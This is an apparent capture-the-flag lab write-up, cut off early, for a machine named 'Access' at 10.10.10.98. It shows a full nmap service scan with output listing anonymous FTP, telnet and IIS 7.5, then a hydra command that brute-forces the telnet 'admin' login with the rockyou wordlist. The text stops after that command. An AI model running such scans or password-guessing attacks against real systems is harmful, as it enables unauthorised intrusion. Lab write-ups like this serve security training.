## ------------->> Access <<--------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.98 -p-
--------

    Nmap scan report for 10.10.10.98
    Host is up (0.20s latency).
    Not shown: 65532 filtered ports
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     Microsoft ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_Can't get directory listing: PASV failed: 425 Cannot open data connection.
    | ftp-syst: 
    |_  SYST: Windows_NT
    23/tcp open  telnet?
    80/tcp open  http    Microsoft IIS httpd 7.5
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/7.5
    |_http-title: MegaCorp
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

// Navigating to http://10.10.10.98/ represent us only with picture called "out.jpg"

![Image 1]()

// 

$hydra -l admin -P ../../../../wordlists--/rockyou.txt 10.10.10.98 telnet







